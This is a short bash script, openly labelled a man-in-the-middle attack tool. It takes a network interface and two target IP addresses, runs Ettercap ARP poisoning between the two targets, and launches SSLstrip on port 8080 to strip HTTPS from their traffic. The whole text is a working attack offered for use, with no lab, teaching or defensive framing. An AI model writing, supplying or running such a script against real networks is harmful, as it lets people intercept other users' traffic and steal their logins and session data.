#!/bin/bash
# Man-in-the-Middle Combined Script
# Uses Ettercap for MITM attack and SSLstrip for HTTPS stripping.

INTERFACE=$1
TARGET1=$2
TARGET2=$3

if [ -z "$INTERFACE" ] || [ -z "$TARGET1" ] || [ -z "$TARGET2" ]; then
  echo "Usage: $0 <interface> <target1_ip> <target2_ip>"
  exit 1
fi

echo "Running Ettercap for MITM attack..."
ettercap -T -q -i $INTERFACE -M arp:remote /$TARGET1/ /$TARGET2/ &

echo "Running SSLstrip for HTTPS stripping..."
sslstrip -l 8080 -a &
